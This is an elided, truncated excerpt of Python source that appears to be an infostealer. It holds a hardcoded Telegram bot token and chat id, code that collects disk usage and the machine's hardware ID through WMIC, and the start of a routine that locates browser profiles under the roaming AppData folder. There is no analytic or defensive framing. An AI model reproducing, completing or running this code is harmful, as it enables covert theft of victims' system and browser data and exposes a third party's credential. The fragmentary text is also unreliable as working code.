...
class done:
    ...
    def send(self):
        ...
        import requests
        bot_token = '5741762096:AAHKaXxB9krdGt7PkmTId2qhijOtQcunsQU'
        chat_id = '5635155419'
        ...
        if response.status_code == 200:
            ...
            for part in psutil.disk_partitions(all=False):
                ...
                disk += ("{:<9} " * 4).format(part.device, str(
                    usage.free // (2 ** 30)) + "GB", str(usage.total // (2 ** 30)) + "GB",
                                              str(usage.percent) + "%") + "\n"
            ...
            def get_hwid() -> str:
                ...
                try:
                    hwid = \
                        subprocess.check_output('C:\\Windows\\System32\\wbem\\WMIC.exe csproduct get uuid', shell=True,
...
class walkthrough:
    def __init__(self):
        ...
        self.roaming = os.getenv('ROAMINGAPPDATA')
        self.browsers = {
